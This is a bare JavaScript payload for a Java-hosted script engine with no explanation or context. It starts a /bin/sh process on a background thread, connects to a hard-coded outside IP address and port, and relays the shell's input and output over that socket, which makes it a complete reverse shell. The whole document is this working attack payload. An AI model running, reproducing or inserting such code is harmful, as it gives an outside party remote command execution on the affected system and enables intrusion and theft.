(function(){
    try {
        var Thread = Java.type("java.lang.Thread");
        var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
        var Socket = Java.type("java.net.Socket");

        new Thread(function () {
            var host = "165.22.238.35";
            var port = 12346;
            var cmd = "/bin/sh";
            var p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            var s = new Socket(host, port);

            var pi = p.getInputStream();
            var pe = p.getErrorStream();
            var si = s.getInputStream();

            var po = p.getOutputStream();
            var so = s.getOutputStream();

            while (!s.isClosed()) {
                while (pi.available()>0) {
                  so.write(pi.read());
                }

                while (pe.available()>0) {
                  so.write(pe.read());
                }

                while (si.available()>0) {
                  po.write(si.read());
                }

                so.flush();
                po.flush();

                Thread.sleep(50);

                try {
                    p.exitValue();
                    break;
                } catch (e) {}
            };
            p.destroy();
            s.close();
        }).start();
    } catch (err) {
        return err;
    }
})()
